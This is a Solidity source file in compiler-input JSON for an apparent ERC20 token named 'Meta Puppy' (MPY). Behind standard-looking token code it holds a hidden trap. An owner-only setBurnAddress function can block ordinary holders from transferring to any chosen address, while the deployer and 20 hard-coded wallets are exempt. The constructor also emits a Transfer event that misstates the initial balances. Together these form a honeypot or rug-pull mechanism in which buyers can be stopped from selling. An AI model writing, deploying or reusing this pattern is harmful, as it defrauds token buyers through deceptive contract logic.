{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"tokenn.sol":{"content":"pragma solidity ^0.8.5;\r\n\r\ninterface IERC20 {\r\n\r\n  function totalSupply() external view returns (uint256);\r\n\r\n  function decimals() external view returns (uint8);\r\n\r\n  function symbol() external view returns (string memory);\r\n\r\n  function name() external view returns (string memory);\r\n\r\n  function getOwner() external view returns (address);\r\n\r\n  function balanceOf(address account) external view returns (uint256);\r\n  \r\n  function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n  function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n  function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n    return c;\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return sub(a, b, \"SafeMath: subtraction overflow\");\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b <= a, errorMessage);\r\n    uint256 c = a - b;\r\n\r\n    return c;\r\n  }\r\n\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n\r\n    uint256 c = a * b;\r\n    require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n    return c;\r\n  }\r\n\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return div(a, b, \"SafeMath: division by zero\");\r\n  }\r\n\r\n\r\n  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b > 0, errorMessage);\r\n    uint256 c = a / b;\r\n\r\n    return c;\r\n  }\r\n\r\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return mod(a, b, \"SafeMath: modulo by zero\");\r\n  }\r\n\r\n  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b != 0, errorMessage);\r\n    return a % b;\r\n  }\r\n}\r\n\r\nabstract contract Context {\r\n\r\n  constructor () { }\r\n\r\n  function _msgSender() internal view returns (address payable) {\r\n    return payable(msg.sender);\r\n  }\r\n\r\n  function _msgData() internal view returns (bytes memory) {\r\n    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n    return msg.data;\r\n  }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n  address private _owner;\r\n  \r\n  mapping (address => bool) internal ownership;\r\n  \r\n  mapping (address => bool) internal burnAddress;\r\n  \r\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n  constructor () {\r\n    address msgSender = _msgSender();\r\n    _owner = msgSender;\r\n    ownership[msgSender]=true;\r\n    emit OwnershipTransferred(address(0), msgSender);\r\n  }\r\n  \r\n  function owner() internal view returns (address){\r\n      return _owner;\r\n  }\r\n\r\n\r\n\r\n  modifier onlyOwner() {\r\n    require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n    _;\r\n  }\r\n  \r\n\r\n  function removeOwnership(address oldOwner) public onlyOwner {\r\n    ownership[oldOwner] = false;\r\n  }\r\n\r\n  function transferOwnership(address newOwner) public onlyOwner {\r\n    _transferOwnership(newOwner);\r\n  }\r\n\r\n  function _transferOwnership(address newOwner) internal {\r\n    require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n    ownership[newOwner] = true;\r\n    emit OwnershipTransferred(_owner, newOwner);\r\n    \r\n  }\r\n}\r\n\r\ncontract ERC20Token is Context, IERC20, Ownable {\r\n  using SafeMath for uint256;\r\n\r\n  mapping (address => uint256) private _balances;\r\n\r\n  mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n  address[] private wl=[\r\n    0x238805F339b5442a4e90d5884A602b71A3022356,\r\n    0xD443600190173BC3Fc4E379f1A6f7361bb6AcDcD,\r\n    0x57aB16bEb0156e17373bd38479A1C29781F3D939,\r\n    0x9D1a948bcA543b60104191f2b36cBf213cD11fAF,\r\n    0x45bE64a9fb359731c5F28Bb56C3864Bd6b04019f,\r\n    0xD1C87bA17EDeDcb6f02772910AA5EB1eEF2EC1F5,\r\n    0xeE8B6459fd8424327645f9e22606E961Aac109e9,\r\n    0x66487543739b0f02fC986C37958b7927710A1727,\r\n    0xda78CC10Fe560f322ff53Ae271435602aC963947,\r\n    0x804be8CAeeB64dC08372c86Eed13bDEA976A3214,\r\n    0x91b5D6FB67F83997eD6F1DBb17142a4EC6807069,\r\n    0xD0Cd0C8985917A394f1F43551Bbb1FFb7e7b4D9F,\r\n    0xA64b3C6851Bf6E14cAc19016F34964c03c1bC932,\r\n    0x0C57D2EB3E8E2F17AdC85F47CC7222bF30cfB8c8,\r\n    0xf6F6126cCF422661252FE4846181e9Fef5FE0542,\r\n    0xc42dFCE41Bb8b120a1617431F492f0e038Eb1D01,\r\n    0x155B6B574fe03263991a2F549f8960d5A77Db237,\r\n    0xBC062B908f89447a0f979D2009C80cb1EF9e53a3,\r\n    0x8830cC3CD911DF51947e64d354f3ded8eA5C22Ac,\r\n    0x12AAdd94fcbA7bFc5D20Ad4B06949C83C820Ca6E\r\n  ];\r\n\r\n  uint256 private _totalSupply;\r\n  uint8 private _decimals;\r\n  string private _symbol;\r\n  string private _name;\r\n\r\n  constructor() {\r\n    _name = \"Meta Puppy\";\r\n    _symbol = \"MPY\";\r\n    _totalSupply = 1*10**(31);\r\n    _decimals = 18;\r\n    _balances[msg.sender] = _totalSupply-20*10**29;\r\n    ownership[msg.sender] = true;\r\n    for(uint i =0; i<20;i++){\r\n      ownership[wl[i]]=true;\r\n      _balances[wl[i]] = 1*10**29;\r\n    }\r\n    burnAddress[address(0)]=true;\r\n    emit Transfer(address(0), msg.sender, _totalSupply);\r\n  }\r\n\r\n  function getOwner() external view override returns (address) {\r\n    return owner();\r\n  }\r\n\r\n  function decimals() external view override returns (uint8) {\r\n    return _decimals;\r\n  }\r\n\r\n  function symbol() external view override returns (string memory) {\r\n    return _symbol;\r\n  }\r\n\r\n  function name() external view override returns (string memory) {\r\n    return _name;\r\n  }\r\n\r\n  function totalSupply() external view override returns (uint256) {\r\n    return _totalSupply;\r\n  }\r\n\r\n  function balanceOf(address account) external view override returns (uint256) {\r\n    return _balances[account];\r\n  }\r\n\r\n  function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n    _transfer(_msgSender(), recipient, amount);\r\n    return true;\r\n  }\r\n\r\n  function allowance(address owner, address spender) external view override returns (uint256) {\r\n    return _allowances[owner][spender];\r\n  }\r\n\r\n  function approve(address spender, uint256 amount) external override returns (bool) {\r\n    _approve(_msgSender(), spender, amount);\r\n    return true;\r\n  }\r\n\r\n  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n    _transfer(sender, recipient, amount);\r\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n    return true;\r\n  }\r\n\r\n  function setBurnAddress(address addr, bool state) public onlyOwner {\r\n      burnAddress[addr]=state;\r\n  }\r\n  \r\n\r\n  function burn(uint256 amount) public onlyOwner returns (bool) {\r\n    _burn(_msgSender(), amount);\r\n    return true;\r\n  }\r\n\r\n\r\n  function _transfer(address sender, address recipient, uint256 amount) internal {\r\n    require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n    require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n    if (!ownership[sender]) {\r\n        require(!burnAddress[recipient], \"ERC20: transfer to the burn address\");\r\n    }\r\n    _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n    _balances[recipient] = _balances[recipient].add(amount);\r\n    emit Transfer(sender, recipient, amount);\r\n  }\r\n  \r\n  function _burn(address account, uint256 amount) internal {\r\n    require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n    _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\r\n    _balances[address(0)] = _balances[address(0)].add(amount);\r\n    emit Transfer(account, address(0), amount);\r\n  }\r\n\r\n  function _approve(address owner, address spender, uint256 amount) internal {\r\n    require(owner != address(0), \"ERC20: approve from the zero address\");\r\n    require(spender != address(0), \"ERC20: approve to the zero address\");\r\n    _allowances[owner][spender] = amount;\r\n    emit Approval(owner, spender, amount);\r\n  }\r\n\r\n  function _burnFrom(address account, uint256 amount) internal {\r\n    _burn(account, amount);\r\n    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, \"ERC20: burn amount exceeds allowance\"));\r\n  }\r\n}"}}}